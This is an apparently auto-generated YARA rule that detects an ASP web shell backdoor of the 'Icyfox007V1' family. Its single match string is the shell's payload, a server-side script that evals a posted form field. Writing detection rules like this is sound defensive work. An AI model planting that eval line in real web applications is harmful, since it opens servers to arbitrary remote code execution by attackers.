rule WebShell_BackDoor_Unlimit_Icyfox007V1_10_Rar_Folder_Asp_A_1294 {
  meta:
    author = "Spider"
    comment = "None"
    date = "None"
    description = "Webshells Auto-generated - file asp.asp"
    family = "Icyfox007V1"
    hacker = "None"
    hash = "2c412400b146b7b98d6e7755f7159bb9"
    judge = "unknown"
    reference = "None"
    threatname = "WebShell[BackDoor]/Unlimit.Icyfox007V1.10.Rar.Folder.Asp.A"
    threattype = "BackDoor"
  strings:
    $s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
  condition:
    all of them
}